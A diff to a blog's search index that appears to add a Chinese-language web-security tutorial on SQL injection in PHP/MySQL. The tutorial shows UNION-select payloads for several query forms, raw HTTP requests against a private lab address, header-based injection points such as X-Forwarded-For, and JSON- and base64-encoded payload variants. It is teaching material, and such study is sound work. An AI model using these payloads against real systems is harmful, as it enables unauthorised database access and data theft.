@@ -1456,12 +1456,14 @@
 <li>cypher.com ZBlog ASP程序</li>
 <li>cypher.sun.com WordPress PHP程序</li>
 <li>bbs.cypher.com 论讨 DZ程序</li>
-<li>oa.cypher.com OA 通达OA程序</li>
+<li>oa.cypher.com OA 通达OA程序<br>
+<br></li>
 </ol>
 <p><strong>端口模式搭建</strong>:（这是两套完全不同的端口，就是两个目标）</p>
 <ol>
 <li>cypher.com ZBlog ASP程序（80默认端口）</li>
-<li>cypher.com:8080 WordPress PHP程序</li>
+<li>cypher.com:81 WordPress PHP程序<br>
+<br></li>
 </ol>
 <p><strong>目录模式搭建</strong>:（这是两套是在一个目录里，但是是两个目标）</p>
 <ol>
@@ -2481,5 +2483,71 @@
       <tags>
         <tag>项目集合</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>PHP应用&amp;SQL注入&amp;符号拼接&amp;请求方法&amp;HTTP头&amp;JSON&amp;编码类</title>
+    <url>/2024/03/17/Web%E6%94%BB%E9%98%B243/</url>
+    <content><![CDATA[<h2 id="PHP-MYSQL-数据请求类型"><a href="#PHP-MYSQL-数据请求类型" class="headerlink" title="PHP-MYSQL-数据请求类型"></a>PHP-MYSQL-数据请求类型</h2><p>SQL语句由于在黑盒中是无法预知写法的，SQL注入能发成功是需要拼接原SQL语句，大部分黑盒能做的就是分析后各种尝试去判断，所以有可能有注入但可能出现无法注入成功的情况。究其原因大部分都是原SQL语句的未知性导致的拼接失败！<br><br></p>
+<p>由于开发者对于数据类型和SQL语句写法（框架写法）导致SQL注入拼接失败，需要解决拼接才能成功</p>
+<ol>
+<li><p>数字型(无符号干扰)</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * from news <span class="built_in">where</span> <span class="built_in">id</span>=<span class="variable">$id</span>;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>字符型（有符号干扰）</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * from news <span class="built_in">where</span> <span class="built_in">id</span>=<span class="string">&#x27;$id&#x27;</span>;</span><br><span class="line">注入语句：http://10.0.1.139:81/new.php?<span class="built_in">id</span>=1<span class="string">&#x27; union select 1,2,3,4,5,6--+</span></span><br><span class="line"><span class="string">拼接语句：select * from news where id=&#x27;</span>1<span class="string">&#x27; union select 1,2,3,4,5,6-- &#x27;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>搜索型（有多符号干扰）</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * from news <span class="built_in">where</span> <span class="built_in">id</span> like <span class="string">&#x27;%$id%&#x27;</span></span><br><span class="line">注入语句：http://10.0.1.139:81/new.php?<span class="built_in">id</span>=1%<span class="string">&#x27; union select 1,2,3,4,5,6--+</span></span><br><span class="line"><span class="string">拼接语句：select * from news where id like &#x27;</span>%1%<span class="string">&#x27; union select 1,2,3,4,5,6-- %&#x27;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>框架型（有各种符号干扰）</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * from news <span class="built_in">where</span> <span class="built_in">id</span>=(<span class="string">&#x27;$id&#x27;</span>);</span><br><span class="line">注入语句：http://10.0.1.139:81/new.php?<span class="built_in">id</span>=1<span class="string">&#x27;) union select 1,2,3,4,5,6--+</span></span><br><span class="line"><span class="string">拼接语句：select * from news where id=(&#x27;</span>1<span class="string">&#x27;) union select 1,2,3,4,5,6-- &#x27;</span>)</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * from news <span class="built_in">where</span> (<span class="built_in">id</span>=<span class="string">&#x27;$id&#x27;</span>);</span><br><span class="line">注入语句：http://10.0.1.139:81/new.php?<span class="built_in">id</span>=1<span class="string">&#x27;) union select 1,2,3,4,5,6--+</span></span><br><span class="line"><span class="string">拼接语句：select * from news where id=(&#x27;</span>1<span class="string">&#x27;) union select 1,2,3,4,5,6-- &#x27;</span>)</span><br></pre></td></tr></table></figure>
+<p>闭合单引号和括号的时候，不一定非要用–+注释掉后面，有时候不起作用的话，使用#和and ‘1’&#x3D;’1也可以，看情况多试</p>
+</li>
+</ol>
+<br>
+
+<h2 id="PHP-MYSQL-数据请求方法"><a href="#PHP-MYSQL-数据请求方法" class="headerlink" title="PHP-MYSQL-数据请求方法"></a>PHP-MYSQL-数据请求方法</h2><p><strong>全局变量方法</strong>：GET，POST，SERVER，FILES，HTTP头等<br><br></p>
+<p>get请求是在上面测试的：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">GET /new.php?<span class="built_in">id</span>=1%27%20union%20select%201,2,3,4,5,6--+ HTTP/1.1</span><br><span class="line">Host: 10.0.1.139:82</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure>
+<br>
+
+<p>post是在下面测试提交的</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">POST /sqli/post.php HTTP/1.1</span><br><span class="line">Host: 10.0.1.139:82</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://10.0.1.139:82/sqli/post.php</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 28</span><br><span class="line"></span><br><span class="line">username=admin&amp;password=1654</span><br></pre></td></tr></table></figure>
+<br>
+
+<p><strong>注入点包括</strong>：</p>
+<p><strong>User-Agent</strong>：使得服务器能够识别客户使用的操作系统，游览器版本等.（很多数据量大的网站中会记录客户使用的操作系统或浏览器版本等存入数据库中）<br><br></p>
+<p><strong>Cookie</strong>：网站为了辨别用户身份、进行session跟踪而储存在用户本地终端上的数据X-Forwarded-For：简称XFF头，它代表客户端，也就是HTTP的请求端真实的IP,（通常一些网站的防注入功能会记录请求端真实IP地址并写入数据库or某文件[通过修改XXF头可以实现伪造IP]）.<br><br></p>
+<p><strong>Rerferer</strong>：浏览器向 WEB 服务器表明自己是从哪个页面链接过来的.<br><br></p>
+<p><strong>Host</strong>：客户端指定自己想访问的WEB服务器的域名&#x2F;IP 地址和端口号<br><br></p>
+<p><strong>X_FORWARDED_FOR</strong>：用户访问的IP其中之一方式</p>
+<br>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$ua</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>]; //数据包里UA头浏览器信息</span><br><span class="line"><span class="variable">$xff</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]; // 数据包里面的X-Forwarded-<span class="keyword">for</span>:1.101.1.11</span><br><span class="line"><span class="variable">$host</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>]; //数据包host地址</span><br><span class="line"><span class="variable">$re</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>]; //访问来源 Referer</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$ua</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$xff</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$host</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$re</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br></pre></td></tr></table></figure>
+<br>
+
+
+
+<p><strong>功能点</strong>：</p>
+<ol>
+<li><p>用户登录时</p>
+</li>
+<li><p>登录判断IP时<br>是PHP特性中的$_SERVER[‘HTTP_X_FORWARDED_FOR’];接受IP的绕过（绕过）<br>实现：代码配置固定IP去判断-策略绕过<br>实现：数据库白名单IP去判断-select注入<br>实现：防注入记录IP去保存数据库-insert注入</p>
+</li>
+<li><p>文件上传将文件名写入数据库-insert注入</p>
+<br></li>
+</ol>
+<h2 id="PHP-MYSQL-数据请求格式"><a href="#PHP-MYSQL-数据请求格式" class="headerlink" title="PHP-MYSQL-数据请求格式"></a>PHP-MYSQL-数据请求格式</h2><ol>
+<li><p>数据采用统一格式传输，后端进行格式解析带入数据库（json）</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;sadadsasd&#x27; union select 1,2,3,4#&quot;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>数据采用加密编码传输，后端进行解密解码带入数据库（base64）</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">3<span class="string">&#x27; union select 1,2,3,4,5,6 --+</span></span><br><span class="line"><span class="string">MycgdW5pb24gc2VsZWN0IDEsMiwzLDQsNSw2IC0tKw==</span></span><br></pre></td></tr></table></figure></li>
+</ol>
+]]></content>
+      <categories>
+        <category>Web攻防</category>
+      </categories>
   </entry>
 </search>
